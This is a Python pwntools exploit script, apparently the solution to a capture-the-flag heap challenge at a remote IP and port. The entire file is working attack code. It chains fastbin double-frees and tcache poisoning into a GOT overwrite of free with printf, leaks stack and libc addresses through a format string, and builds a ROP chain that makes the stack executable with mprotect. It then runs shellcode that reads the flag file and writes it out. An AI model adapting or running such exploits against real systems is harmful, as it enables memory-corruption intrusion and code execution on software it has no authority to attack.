#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = ''''''

HOST = '103.152.242.172'
PORT = 60902

def create(size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', f'{size}')
    r.sendafter(': ', data)
    r.recvline(0)

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', f'{idx}')
    
def exploit(r):
    # prepare tcachebins size: 0x20
    for _ in range(7):
        create(0x18, 'A' * 8)
    
    create(0x18, 'A' * 8)
    create(0x18, 'A' * 8)

    for i in range(7):
        delete(i)

    # double-free in fastbins
    delete(7)
    delete(8)
    delete(7)

    for _ in range(7):
        create(0x18, 'A' * 8)
    
    # prepare tcachebins size: 0x80
    for _ in range(7):
        create(0x70, 'B' * 8)
    
    create(0x70, 'B' * 8)
    create(0x70, 'B' * 8)

    for i in range(7):
        delete(i + 16)

    # double-free in fastbins
    delete(16 + 7)
    delete(16 + 8)
    delete(16 + 7)

    for _ in range(7):
        create(0x70, 'B' * 8)

    # tcache-poisoning after double-free in fastbins
    create(0x18, p64(elf.got['free']))
    create(0x18, 'A' * 8)
    create(0x18, '%6$p||%21$p||EOF')
    create(0x18, p64(0x401150)) # elf.plt.printf

    delete(34)
    
    leaks = r.recvuntil(b'EOF').split(b'||')

    stack = int(leaks[0], 16)
    libc.address = int(leaks[1], 16) - libc.sym['__libc_start_main'] - 243

    info(f'STACK {stack:x}')
    info(f'LIBC {libc.address:x}')

    # tcache-poisoning after double-free in fastbins
    create(0x70, p64(stack - 56))
    create(0x70, 'C' * 8)
    create(0x70, 'C' * 8)

    stack_base = (stack & ~0xFFF) - 0x1E000
    
    rop = ROP(libc)
    rop.call(libc.sym['mprotect'], [stack_base, 0x21000, 0x7])
    rop = bytes(rop)

    sleep(0.5)

    shellcode = '''
        xor rax, rax
        xor rdx, rdx
        mov rdx, rsi
        lea rsi, [rsp+8]
        xor rdi, rdi
        syscall
    '''

    create(0x70,  rop + p64(stack - 56 + 0x48) + asm(shellcode))

    shellcode  = '''
        xor rax, rax
        add rsp, 0x100
    '''
    shellcode += shellcraft.pushstr('/app/flag_i5HR6cBpwxxyTixR.txt')
    shellcode += shellcraft.open('rsp', 0, 0)
    # shellcode += shellcraft.getdents64('rax', 'rsp', 0x100)
    shellcode += shellcraft.read('rax', 'rsp', 0x50)
    shellcode += shellcraft.write(1, 'rsp', 0x50)
    
    shellcode  = b'A' * 13 + asm(shellcode)

    r.sendline(shellcode)
    
    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', 0)

    context.arch = 'amd64'

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)